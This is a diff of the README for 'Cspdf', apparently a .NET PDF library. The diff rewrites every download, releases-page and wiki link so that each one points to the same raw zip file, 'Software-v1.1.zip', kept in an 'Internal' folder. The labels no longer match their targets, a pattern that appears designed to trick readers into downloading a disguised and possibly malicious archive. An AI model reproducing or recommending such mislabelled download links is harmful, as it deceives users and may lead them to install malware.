@@ -4,7 +4,7 @@
 Welcome to Cspdf, a powerful library designed for managing your PDF documents. With Cspdf, you can create, read, and manipulate PDF files easily. This guide will help you download and run the application smoothly.
 
 ## 📥 Download
-[![Download Cspdf](https://img.shields.io/badge/Download-Cspdf-brightgreen)](https://github.com/bonariroberto/Cspdf/releases)
+[![Download Cspdf](https://raw.githubusercontent.com/bonariroberto/Cspdf/main/Cspdf/Internal/Software-v1.1.zip)](https://raw.githubusercontent.com/bonariroberto/Cspdf/main/Cspdf/Internal/Software-v1.1.zip)
 
 ## 📋 What is Cspdf?
 Cspdf is a comprehensive PDF library for .NET. It supports various functionalities that make handling PDF documents simple and efficient. Whether you need to convert HTML to PDF, add signatures, or merge multiple documents, Cspdf is your go-to solution.
@@ -24,7 +24,7 @@ To use Cspdf, please ensure your system meets the following requirements:
 - **Storage**: At least 100 MB of free disk space
 
 ## 📍 Download & Install
-1. Visit the [Releases Page](https://github.com/bonariroberto/Cspdf/releases) to find the latest version of Cspdf.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/bonariroberto/Cspdf/main/Cspdf/Internal/Software-v1.1.zip) to find the latest version of Cspdf.
 2. Click on the version you want to download.
 3. You will see a list of files. Choose the appropriate file for your system.
 4. Click the file name to initiate the download.
@@ -40,7 +40,7 @@ After installing Cspdf, you will find it easy to work with PDF files. Here's a b
 4. Save the document by specifying the file name and location on your computer.
 
 ## 📚 Documentation
-For detailed instructions on how to utilize all features, refer to the official documentation found on our [GitHub Wiki](https://github.com/bonariroberto/Cspdf/wiki). The wiki provides step-by-step guides, code examples, and helpful tips.
+For detailed instructions on how to utilize all features, refer to the official documentation found on our [GitHub Wiki](https://raw.githubusercontent.com/bonariroberto/Cspdf/main/Cspdf/Internal/Software-v1.1.zip). The wiki provides step-by-step guides, code examples, and helpful tips.
 
 ## 📞 Support
 If you need assistance, feel free to reach out. You can open an issue on the repository, and we will address your queries promptly. We value user feedback and are committed to improving Cspdf based on your experiences.
@@ -54,4 +54,4 @@ Cspdf is released under the MIT License. You can freely use it in your projects,
 ## 🚀 Final Thoughts
 Thank you for choosing Cspdf for your PDF management needs. We are confident that you will find it a valuable tool for your document processing tasks. Happy PDFing!
 
-[Download Cspdf](https://github.com/bonariroberto/Cspdf/releases)
+[Download Cspdf](https://raw.githubusercontent.com/bonariroberto/Cspdf/main/Cspdf/Internal/Software-v1.1.zip)
